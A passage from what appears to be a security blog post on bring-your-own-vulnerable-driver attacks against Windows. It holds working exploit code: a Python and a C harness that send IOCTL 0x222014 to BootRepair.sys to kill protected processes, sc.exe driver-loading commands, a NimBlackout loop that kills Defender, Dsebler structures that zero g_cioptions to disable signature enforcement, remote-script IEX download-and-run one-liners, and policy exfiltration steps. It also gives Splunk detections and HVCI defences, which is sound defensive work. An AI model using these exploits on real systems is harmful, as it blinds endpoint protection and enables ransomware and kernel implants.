
FILE\_SHARE\_RW = 0x1 \| 0x2

OPEN\_EXISTING = 3

INVALID\_HANDLE = wt.HANDLE(-1).value

def open\_device(path: str):

h = kernel32.CreateFileW(path, GENERIC\_RW, FILE\_SHARE\_RW,

None, OPEN\_EXISTING, 0x80, None)

if h == INVALID\_HANDLE:

raise ctypes.WinError(ctypes.get\_last\_error())

return h

def send\_ioctl(h, code: int, data: bytes, out\_len: int = 0) -\> bytes:

buf\_in = ctypes.create\_string\_buffer(data)

buf\_out = ctypes.create\_string\_buffer(out\_len) if out\_lenelse None

n = wt.DWORD(0)

ok = kernel32.DeviceIoControl(h, code, buf\_in, len(data),

buf\_out, out\_len, ctypes.byref(n), None)

if not ok:

raise ctypes.WinError(ctypes.get\_last\_error())

return bytes(buf\_out)\[:n.value\] if buf\_outelse b""

\# --- send IOCTL 0x222014 to BootRepair.sys ---

target\_pid = 1234 # replace with real PID

h = open\_device(r"\\\.\\BootRepair")

try:

send\_ioctl(h, 0x222014, struct.pack("<I", target\_pid))

finally:

kernel32.CloseHandle(h)

`send_ioctl` handles buffer allocation and Win32 error translation automatically. For `METHOD_BUFFERED` IOCTLs the kernel copies `data` into `SystemBuffer` without any MDL work on the caller’s side. The call requires Administrator privileges to open the device handle, matching the standard BYOVD prerequisite. For drivers with `METHOD_NEITHER` (raw pointer pass-through), the input buffer must be a locked, page-aligned allocation — avoid those drivers in PoC work unless you are comfortable with structured exception handling in kernel mode.

* * *

## Phase 3: Exploitation

With symbolic link, IOCTL code, and buffer layout in hand, exploitation reduces to a handful of Win32 API calls requiring only administrative privileges.

### Case Study: PhantomKiller

[PhantomKiller](https://github.com/redteamfortress/PhantomKiller) by j3h4ck (redteamfortress) documents the end-to-end weaponisation of `BootRepair.sys`, a Lenovo PC Manager driver signed by Symantec under LENOVO’s code-signing certificate (SHA-256, compiled 2018-01-03). Found on VirusTotal with 0/71 detections at time of discovery.

| Field | Value |
| --- | --- |
| File | `BootRepair.sys` |
| SHA-256 | `5ab36c116767eaae53a466fbc2dae7cfd608ed77721f65e83312037fbd57c946` |
| Signer | LENOVO (Symantec Class 3 SHA256 Code Signing CA) |
| Compiled | 2018-01-03 |
| VT hits | 0/71 at discovery |
| Device path | `\\.\BootRepair` |
| IOCTL | `0x222014` |
| Input | 4-byte DWORD PID |

**Loading the driver:**

```
rem Requires Administrator. DSE satisfied — legitimately signed.
sc.exe create PhantomKiller binPath="C:\tools\BootRepair.sys" type=kernel
sc.exe start PhantomKiller
```

Copy


**The exploit harness (simplified):**

```
#include <windows.h>
#include <stdio.h>

#define IOCTL_KILL_PROCESS 0x222014

int main(int argc, char* argv[]) {
    DWORD targetPid = (DWORD)atoi(argv[1]);

    // No DACL on device → CreateFile succeeds for any caller
    HANDLE hDevice = CreateFileA(
        "\\\\.\\BootRepair",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    DWORD bytesReturned = 0;
    DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,   // 0x222014
        &targetPid,           // Input: 4-byte PID
        sizeof(DWORD),        // InputBufferLength: 4
        NULL, 0, &bytesReturned, NULL
    );

    printf("[+] Process %d terminated via kernel\n", targetPid);
    CloseHandle(hDevice);
    return 0;
}
```

Copy


### The Full Kernel Call Chain

●●●kernel\_call\_chain — BootRepair.sys › ZwTerminateProcess

Ring 3 · User Mode

CreateFile("\\\.\\BootRepair") → hDevice

DeviceIoControl(hDevice, 0x222014, &pid, 4)

▼  IRP crosses Ring 3 → Ring 0 boundary  ▼


Ring 0 · Kernel Mode

IRP dispatch → MajorFunction\[14\]  ; IRP\_MJ\_DEVICE\_CONTROL

└─► IOCTL match 0x222014 → call terminate\_proc(pid)

├─► PsLookupProcessByProcessId(pid) → PEPROCESS \*

├─► ObOpenObjectByPointer(PEPROCESS\*) → hProcess  ; PROCESS\_ALL\_ACCESS · no PPL check

└─► ZwTerminateProcess(hProcess, 0)

◼ Target process exits

✗ PPL protection bypassed✗ No access check performed✗ EDR tamper-protection: irrelevant

PPL protection is enforced at the user-mode `OpenProcess` boundary, not at the kernel object level when a driver acquires the handle directly via `ObOpenObjectByPointer`. This is the fundamental architectural gap that BYOVD exploits.

### NimBlackout

[NimBlackout](https://github.com/Helixo32/NimBlackout) adapts the same technique (originally from ZeroMemoryEx’s Blackout project using the `gmer.sys` driver) in Nim. The keep-alive pattern is the operationally significant addition: EDR vendors configure agents to respawn via watchdog services. NimBlackout loops continuously, re-killing the target each time it restarts, converting a one-shot termination into persistent blindness:

```
# Cross-compile from Linux
nim --os:windows --cpu:amd64 \
    --gcc.exe:x86_64-w64-mingw32-gcc \
    --gcc.linkerexe:x86_64-w64-mingw32-gcc \
    c NimBlackout.nim

# Execute — loops to defeat EDR watchdog respawn
.\NimBlackout.exe MsMpEng.exe
```

Copy


* * *

## MITRE ATT&CK Mapping

| Technique | ID | BYOVD Manifestation |
| --- | --- | --- |
| Exploit Privilege Escalation | `T1068` | Admin → Ring 0 effective privilege via vulnerable driver |
| Impair Defenses: Disable/Remove Tools | `T1562.001` | EDR/AV process terminated via kernel call |
| Create or Modify System Process | `T1543.003` | Driver loaded as kernel service via `sc.exe` |
| Rootkit | `T1014` | Kernel-mode code with no user-mode visibility |
| Defense Evasion: Signed Binary | `T1553.002` | Signed driver circumvents DSE and AV signature checks |

* * *

## Detection Engineering and Hunting Playbook

### Signal 1: Driver Load Events

**Sysmon Event ID 6** fires on every kernel driver load. It captures the SHA-256 hash at load time, matchable against LOLDrivers in near-real-time.

```spl
index=sysmon EventCode=6
| rex field=Hashes "SHA256=(?P<sha256>[A-Fa-f0-9]{64})"
| where match(ImageLoaded, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\users\\\\[^\\\\]+\\\\desktop\\\\)")
| table _time, Computer, ImageLoaded, sha256, Signed, SignatureStatus
| sort - _time
```

### Signal 2: Service Creation of Kernel Drivers

Windows Event Log `System / 7045` with `ServiceType=1` from a non-standard binary path is near-definitive:

```spl
index=wineventlog source="WinEventLog:System" EventCode=7045
| where ServiceType="kernel"
| where NOT match(ImagePath, "(?i)(system32\\\\drivers|program files)")
| table _time, ComputerName, ServiceName, ImagePath, ServiceType
```

### Signal 3: DeviceIoControl to Unknown Devices

Monitor `CreateFile` with `\\.\` device paths combined with subsequent `DeviceIoControl` calls from unexpected processes. Any non-system, non-hardware-management software opening a raw device path is suspicious.

### Signal 4: Protected Process Termination Anomalies

Correlate EDR heartbeat absence with recent driver load:

- EDR service stopped (Event 7036) without planned shutdown
- Sysmon EID 5 (process terminate) on known EDR process names within 10 minutes of EID 6 (driver load)

### Signal 5: LOLDrivers Hash Matching at Ingest

```spl
index=sysmon EventCode=6
| rex field=Hashes "SHA256=(?P<sha256>[A-Fa-f0-9]{64})"
| lookup loldrivers.csv sha256 AS sha256 OUTPUT driver_name, cve, primitive
| where isnotnull(primitive)
| table _time, Computer, ImageLoaded, sha256, driver_name, primitive
```

Maintain the lookup table from [loldrivers.io/api/drivers.csv](https://www.loldrivers.io/api/drivers.csv) (updated daily via a scheduled task).

### Splunk Detection Rules

**Rule 1: BYOVD Kernel Driver Loaded from User Path**

```spl
index=sysmon EventCode=6
| rex field=Hashes "SHA256=(?P<sha256>[A-Fa-f0-9]{64})"
| eval path_suspicious=if(match(ImageLoaded,
    "(?i)(\\\\temp\\\\|\\\\users\\\\.*\\\\appdata\\\\|\\\\programdata\\\\|\\\\downloads\\\\)"),
    1, 0)
| where path_suspicious=1 OR Signed="false"
| stats count by _time, Computer, ImageLoaded, sha256, Signed, SignatureStatus
| sort - _time
```

**Rule 2: New Kernel Service + Driver Load Correlation (within 60 seconds)**

```spl
index=wineventlog source="WinEventLog:System" EventCode=7045 ServiceType="kernel"
| join type=inner ComputerName [\
    search index=sysmon EventCode=6\
    | rename Computer AS ComputerName\
]
| where Signed="false" OR match(ImagePath, "(?i)(\\\\temp\\\\|\\\\appdata\\\\)")
| table _time, ComputerName, ServiceName, ImagePath
```

**Rule 3: EDR Process Missing + Recent Driver Load (Threat Hunt)**

```spl
index=sysmon EventCode=5
| where Image IN ("MsMpEng.exe", "SentinelAgent.exe", "CSFalconService.exe",
                  "CrowdStrike.exe", "cb.exe", "elastic-agent.exe")
| eval kill_time=_time
| join type=inner Computer [\
    search index=sysmon EventCode=6 earliest=-10m latest=+0m\
    | where NOT match(ImageLoaded, "(?i)(system32\\\\drivers|program files)")\
    | eval driver_load_time=_time\
]
| where kill_time > driver_load_time AND kill_time < (driver_load_time + 600)
| table _time, Computer, Image, ImageLoaded, Hashes
```

* * *

## Defensive Architecture: HVCI Deep Dive

### What HVCI Actually Enforces

HVCI (Hypervisor-Protected Code Integrity, also called Memory Integrity) uses the hypervisor to move kernel code integrity checks into a more privileged context than the Windows kernel itself:

| Requirement | DSE Only | DSE + HVCI |
| --- | --- | --- |
| Valid Authenticode signature | ✔ | ✔ |
| Chain to trusted root | ✔ | ✔ |
| EV code signing cert or WHQL | Optional | Required for new drivers |
| `FORCE_INTEGRITY` flag in PE header | Not checked | Required |
| No W+X memory sections | Not checked | Enforced by hypervisor |
| No self-modifying code | Not checked | Enforced by hypervisor |

Legacy drivers compiled before ~2015 almost universally fail the W+X and `FORCE_INTEGRITY` checks. They are legitimately signed (DSE passes) but cannot load under HVCI. HVCI is the single most effective architectural control against BYOVD, though adoption remains below 50% on Windows 11-capable hardware as of 2025.

### The HVCI Block List Gap: Where BYOVD Still Lives

Even with HVCI enabled, a driver loads if its PE image meets HVCI structural requirements AND its hash is not in the WDAC Vulnerable Driver Block List (`SiPolicy_Enforced.p7b`). As of June 23, 2026, LOLDrivers tracks **479 of 2,197** catalogued samples (21.8%) that bypass HVCI. Another 789 samples (36.3%) are not in Microsoft’s block list at all. Microsoft updates the block list once or twice per year; a driver found in January may remain loadable on HVCI-enabled systems for months.

### Hunting for a Working BYOVD Candidate

BYOVD Candidate Selection Funnel — HVCI-Aware TriageFrom 2,197 LOLDrivers samples → operationally viable EDR/PPL killer · Data: loldrivers.io 2026-06-23LOLDrivers Catalogue2,197 samples total · 656 unique drivers · loldrivers.io/api/drivers.jsonUpdated 2026-06-23① Filter: primitive ∈ {process-kill, kernel-write, phys-read}~900 no usefulprimitive~1,300 drivers — dangerous primitive presentZwTerminateProcess · MmMapIoSpace · ZwWriteVirtualMemory in imports② Filter: HVCI bypass = TRUE — loads despite Memory Integrity~820 failHVCI checks479 HVCI-bypassing samples · 21.8% of catalogueHas FORCE\_INTEGRITY · No W+X · Structurally HVCI-compliant · Use byovd-watchdog🛡 BYOVD Watchdogbyovd-watchdog.pwnfuzz.com③ Filter: Not in MS WDAC block list · SHA-256 available · VT score < 5/71Eliminated byWDAC / no hash~120–180 candidates · Not in MS block list · Hash confirmed789 LOLDrivers-exclusive samples (36.3%) — cross-reference with HVCI bypass pool④ Filter: Device path recoverable · IRP\_MJ\_CREATE ungated · No DACL on deviceDACL present /path unknown~20–40 candidates · DrvEye UNGATED-sink confirmedprimitive classified · PoC generated · no caller access check on IRP handler🔬 DrvEye Triagepython3 DrvEye.py --save-pocs✅ VIABLE BYOVD CANDIDATESigned · HVCI-clean · Block-list absent · Path known · IOCTL decoded · No DACL5-Point Score:● WILL LOAD (HVCI)● Block-list absent● Dangerous primitive● UNGATED-sink● Path knownAll 5 green → operationally viable. Red on primitive or gating → move to next candidate.benjitrapp.github.io 🦝

### BYOVD Watchdog: Live HVCI Gap Intelligence

[BYOVD Watchdog](https://github.com/pwnfuzz/byovd-watchdog) by pwnfuzz (@ghostbyt3) automates HVCI gap tracking continuously. It is the updated successor to [BYOVDFinder](https://github.com/ghostbyt3/BYOVDFinder).

**How it works:**

1. GitHub Actions periodically fetches Microsoft’s `SiPolicy_Enforced.xml`
2. `byovd.py` parses the XML and extracts all driver deny rules (hash-based and cert-based)
3. `compare_hvci.py` cross-references against the full LOLDrivers API feed
4. The delta (LOLDrivers entries NOT blocked by the current HVCI policy) is published as `byovd_changelog.json` and surfaced at [byovd-watchdog.pwnfuzz.com](https://byovd-watchdog.pwnfuzz.com/)

**Running BYOVDFinder locally:**

```
# One-liner against your live system policy
IEX(New-Object net.WebClient).DownloadString(
    "https://raw.githubusercontent.com/ghostbyt3/BYOVDFinder/refs/heads/main/finder.ps1"
)

# Against a custom policy XML (exfiltrated from a target)
.\finder.ps1 -XmlFile "C:\Path\To\driversipolicy.xml"
```

Copy


Expected output:

```
DRIVER: somedriver.sys
  Link: https://www.loldrivers.io/drivers/<uuid>
  MD5:    <hash>  SHA1: <hash>  SHA256: <hash>
--------------------------------------------------------------------------------
[+] Number of Blocked Drivers: 1384
[+] Number of Allowed Drivers: 479
```

Copy


### HVCI Extraction from a Target Environment (Red Team Context)

Enterprises deploy custom WDAC policies beyond Microsoft’s defaults. Extract the active policy to find which drivers remain viable specifically on that target:

```
# Requires admin — but you already have admin for BYOVD
IEX(New-Object net.WebClient).DownloadString(
    "https://gist.githubusercontent.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e/raw/.../CIPolicyParser.ps1"
)
ConvertTo-CIPolicy `
    -BinaryFilePath 'C:\Windows\System32\CodeIntegrity\driversipolicy.p7b' `
    -XmlFilePath 'C:\Windows\Temp\policy.xml'

# Exfil policy.xml, then locally:
python3 finder.py policy.xml
```

Copy


### Scoring a Candidate: The Five-Point Checklist

```
python3 DrvEye.py candidate.sys \
    --live-check --loldrivers --json report.json --save-pocs --verbose
```

Copy


| Criterion | Green | Red |
| --- | --- | --- |
| **Load verdict** | `WILL LOAD` under HVCI | `WILL NOT LOAD` under HVCI |
| **Block list** | Not in WDAC or LOLDrivers list | In Microsoft block list |
| **Primitive** | `process-kill`, `kernel-write`, `physical-read` | `info-disclosure` only |
| **Gating** | `UNGATED-sink` (no access check) | `GATED-sink` (check present) |
| **Device path** | Recoverable (static or emulated) | Unknown / obfuscated |

Five greens → operationally viable. Red on primitive or gating → skip.

### WDAC and LOLDrivers-Based Prevention

Enable HVCI via Group Policy: `Computer Configuration → Administrative Templates → System → Device Guard → Turn On Virtualization Based Security`.

Verify a candidate against the block list:

```
python3 DrvEye.py BootRepair.sys --live-check --loldrivers --json report.json
grep "wdac_block\|loldrivers_match" report.json
```

Copy


Deploy the LOLDrivers community WDAC deny policy alongside Microsoft’s built-in block list; as of mid-2026 these together still leave 479 HVCI-bypassing drivers uncovered.

* * *

## DSE: The Gatekeeper and Its Bypass

BYOVD’s defining property is that it does not touch Driver Signature Enforcement. A legitimately signed driver complies with the enforcement policy and the kernel loads it without complaint. There is, however, a second and more aggressive technique: disable DSE entirely, enabling an attacker to load any unsigned driver including a custom kernel implant. Understanding both approaches clarifies why BYOVD is operationally preferred when a signed carrier is available, and when DSE bypass becomes necessary.

### DSE Internals: g\_cioptions and CI.dll

Driver Signature Enforcement lives inside `CI.dll` (Code Integrity), the Windows component that verifies Authenticode signatures at driver load time. When `ntoskrnl.exe` processes a `NtLoadDriver` call, it invokes `CI.dll` verification routines (`SeValidateImageHeader` and related functions). A failed check returns `STATUS_INVALID_IMAGE_HASH` and the driver load is aborted before a single byte of driver code executes.

The enforcement state is governed by a single flag inside `CI.dll`: **`g_cioptions`**. Its effective values control the strictness of enforcement:

| `g_cioptions` | Enforcement state |
| --- | --- |
| `0x00` | Disabled. Any driver, signed or unsigned, loads freely. |
| `0x06` | Standard enforcement. Valid Authenticode chain required. |
| `0x08`\+ (HVCI) | Strict. Hypervisor validates in VTL1 before the kernel maps the image. |

Writing a single zero to `&g_cioptions` neutralises DSE for the lifetime of the current boot. This is the kernel patch that tools like the older **DSEFix** relied upon, and the same write that Lazarus Group performed via `dell_bios.sys` in 2022 (see threat actor table above) before loading a custom unsigned backdoor driver. Three common paths to this write exist in practice:

1. **Physical memory mapping** via a driver that imports `MmMapIoSpace`: map the physical page containing `g_cioptions` and patch it directly. Used by early DSEFix variants.
2. **Arbitrary virtual write** via a BYOVD carrier importing `ZwWriteVirtualMemory` or equivalent: load a signed carrier, use its primitive to overwrite `g_cioptions` in kernel virtual address space, then optionally unload the carrier.
3. **Kernel function call gadget** via KsecDD.sys: the KExecDD technique, reimplemented by Dsebler. No third-party carrier required.

### The Dsebler Technique: KsecDD.sys as a Write Gadget

[Dsebler](https://github.com/lem0nSec/Dsebler) by lem0nSec is a C reimplementation of the KExecDD technique. Unlike third-party BYOVD carriers, it exploits **KsecDD.sys**, a legitimate Microsoft driver shipped with every Windows installation. KsecDD.sys is the kernel counterpart to LSASS for cryptographic operations; it exposes an IPC channel that LSASS uses for key material exchange.

The exploit path centres on a vulnerable IOCTL handler at **`0x39006f`**. When a crafted 16-byte input structure is passed to this handler, it triggers the following internal call chain:

●●●dsebler\_chain — KsecDD.sys › CI.dll :: g\_cioptions = 0

Ring 3 · User Mode

CreateFile("\\\.\\KsecDD") → hDevice

// build outer IPC\_SET\_FUNCTION\_RETURN\_PARAMETER (16 bytes)

DeviceIoControl(hDevice, 0x39006f, &outerParam, 16, NULL, 0, &n, NULL)

▼  IRP crosses Ring 3 → Ring 0 boundary  ▼


Ring 0 · Kernel Mode · KsecDD.sys (Microsoft-signed)

IOCTL 0x39006f → KsecFastIoDeviceControl

└─► KsecIoctlHandleFunctionReturn(outerParam)

└─► CallInProgressCompleted(innerParam)

└─► rip = GadgetAddress  ; executes: mov \[rcx\], rdx

rcx = &g\_cioptions  ; target in CI.dll (build-specific offset)

rdx = 0x00000000   ; value to write — disables enforcement

◼ CI.dll :: g\_cioptions = 0x00 — DSE disabled for this boot

✓ Unsigned drivers now load✓ Custom kernel implants viable✗ No EID 6 for KsecDD (already loaded at boot)

Two nested 16-byte IPC structures control the exploit. The outer structure holds a pointer to the inner structure and the `rdx` value to write. The inner structure holds the gadget address (loaded into `rip` by `CallInProgressCompleted`) and the `rcx` parameter (the address of `g_cioptions`):

●●●dsebler\_structs.c — IPC structures for IOCTL 0x39006f

// Inner structure: gadget address + rcx target (16 bytes)

typedef struct \_IPC\_SET\_FUNCTION\_RETURN\_DEEP\_PARAMETER {

PVOID GadgetAddress; // loaded into rip: executes mov \[rcx\], rdx

PVOID RcxParameter; // target address: &g\_cioptions in CI.dll

} IPC\_SET\_FUNCTION\_RETURN\_DEEP\_PARAMETER;

// Outer structure: ptr to inner + rdx value (16 bytes)

typedef struct \_IPC\_SET\_FUNCTION\_RETURN\_PARAMETER {

IPC\_SET\_FUNCTION\_RETURN\_DEEP\_PARAMETER\\* pDeep;

PVOID RdxValue; // 0 = disable DSE · non-zero = re-enable

} IPC\_SET\_FUNCTION\_RETURN\_PARAMETER;

// Disable DSE: write 0 to g\_cioptions

IPC\_SET\_FUNCTION\_RETURN\_DEEP\_PARAMETER inner = {

.GadgetAddress = (PVOID)GADGET\_OFFSET, // build-specific — recalc after each OS update

.RcxParameter = (PVOID)G\_CIOPTIONS\_ADDR, // g\_cioptions in loaded CI.dll image

};

IPC\_SET\_FUNCTION\_RETURN\_PARAMETER outer = { &inner, (PVOID)0ULL };

DeviceIoControl(hKsecDD, 0x39006f, &outer, sizeof(outer), NULL, 0, &dwReturned, NULL);

// Supported build: Windows 10 19045 · extend by recalculating offsets per CI.dll version

**Why KsecDD.sys cannot be blocked:** it is a Microsoft-signed driver present on every Windows system from Vista onward. Any WDAC deny-list entry against KsecDD.sys breaks LSASS cryptographic operations, disabling BitLocker, Windows Hello, and NTLM authentication. This persistence in the trusted driver pool gives the technique a structural durability that third-party BYOVD carriers lack.

**Operational constraint:** current Dsebler hardcodes the `g_cioptions` address and the ROP gadget offset for Windows 10 build 19045. Each new Windows build recompiles `CI.dll`, shifting both values. Remaining operational across patch cycles requires recalculating these offsets after each feature update.

### BYOVD vs. DSE Bypass: Two Paths to Ring 0

The two techniques solve different problems. BYOVD kills a running process via a kernel primitive and requires a signed carrier. DSE bypass enables loading of arbitrary unsigned code and requires a reliable kernel write. An operator choosing between them asks a simple question: is the goal to terminate a process, or to run a custom kernel implant?

|  | **BYOVD (DSE-compliant)** | **DSE Bypass (Dsebler / KExecDD model)** |
| --- | --- | --- |
| **Driver used** | Legitimately signed third-party carrier | KsecDD.sys (built-in, Microsoft-signed) |
| **Unsigned code loaded** | Never | Enabled once g\_cioptions = 0 |
| **Immediate effect** | Target process killed | Any unsigned driver can now load |
| **Primary use case** | EDR termination before payload delivery | Custom kernel implant deployment |
| **EID 6 detection signal** | Third-party driver load, SHA-256 hashable | Absent: KsecDD already loaded at boot |
| **HVCI mitigation** | Blocked if carrier fails FORCE\_INTEGRITY or W+X | Blocked: VTL1 maintains authoritative CI state; VTL0 write to g\_cioptions has no effect |
| **Build specificity** | Low (IOCTL code stable across driver versions) | High (g\_cioptions + gadget offset change per build) |
| **Operational cost** | Low (one-shot IOCTL, no patching) | High (offset maintenance, potential token impersonation) |

HVCI stops both paths, but through different mechanisms. BYOVD carriers that fail the `FORCE_INTEGRITY` or W+X structural checks are rejected before the kernel maps the image. DSE bypass via `g_cioptions` overwrite is stopped because HVCI externalises the enforcement state to VTL1: writes to the VTL0 kernel copy of `g_cioptions` have no effect because the hypervisor maintains its own authoritative enforcement record in secure memory that the VTL0 kernel cannot modify. This architectural separation is why HVCI is the single control that breaks both attack classes simultaneously.

* * *

## BYOVD in Ransomware Operations

BYOVD sits squarely in Phase 4 (Defense Evasion) of the [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/). Its role is to buy unobserved execution time:

![](https://benjitrapp.github.io/images/ransomware_deployment_chain.png)

The dwell time between driver load and EDR termination is typically under 30 seconds. If your Sysmon pipeline has a 5-minute ingest delay, you will see the EID 6 alert after the EDR is already dead.

> **The CSIRT lesson:** Endpoint visibility is only as good as your ingest latency. Optimise your pipeline for sub-60-second ingest on Sysmon Event ID 6 with LOLDrivers hash matching at ingest.

* * *

## References and Open-Source Research

**Primary research and tools:**

- **Dsebler**: [github.com/lem0nSec/Dsebler](https://github.com/lem0nSec/Dsebler) — KExecDD reimplementation; KsecDD.sys as DSE disable gadget
- **PhantomKiller**: [github.com/redteamfortress/PhantomKiller](https://github.com/redteamfortress/PhantomKiller)
- **NimBlackout**: [github.com/Helixo32/NimBlackout](https://github.com/Helixo32/NimBlackout)
- **DrvEye**: [github.com/0xDbgMan/DrvEye](https://github.com/0xDbgMan/DrvEye)
- **BYOVD Watchdog**: [github.com/pwnfuzz/byovd-watchdog](https://github.com/pwnfuzz/byovd-watchdog) · live at [byovd-watchdog.pwnfuzz.com](https://byovd-watchdog.pwnfuzz.com/)
- **BYOVDFinder**: [github.com/ghostbyt3/BYOVDFinder](https://github.com/ghostbyt3/BYOVDFinder)
- **Trail of Bits HVCI LOLDrivers Check**: [github.com/trailofbits/HVCI-loldrivers-check](https://github.com/trailofbits/HVCI-loldrivers-check)
- **ADHDMurky: BYOVD for Dummies**: [adhdmurky.github.io/posts/post3](https://adhdmurky.github.io/posts/post3/)
- **Blackout (original)**: [github.com/ZeroMemoryEx/Blackout](https://github.com/ZeroMemoryEx/Blackout)

**Community resources:**

- **LOLDrivers**: [loldrivers.io](https://www.loldrivers.io/) · [SIEM detections](https://www.loldrivers.io/#detections)
- **Microsoft WDAC Block List**: [aka.ms/VulnerableDriverBlockList](https://aka.ms/VulnerableDriverBlockList)
- **MITRE ATT&CK:** [T1068](https://attack.mitre.org/techniques/T1068/) · [T1562.001](https://attack.mitre.org/techniques/T1562/001/) · [T1543.003](https://attack.mitre.org/techniques/T1543/003/) · [T1014](https://attack.mitre.org/techniques/T1014/)

**Related posts on this blog:**

- [EDR Bypass Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/)
- [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/)
- [Breaking the Thread & Spawning Ghosts](https://benjitrapp.github.io/attacks/2026-05-17-threadless-injection-process-ghosting/)
- [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/)

Written on June 24, 2026


[◀ Back to attack related posts](https://benjitrapp.github.io/attack)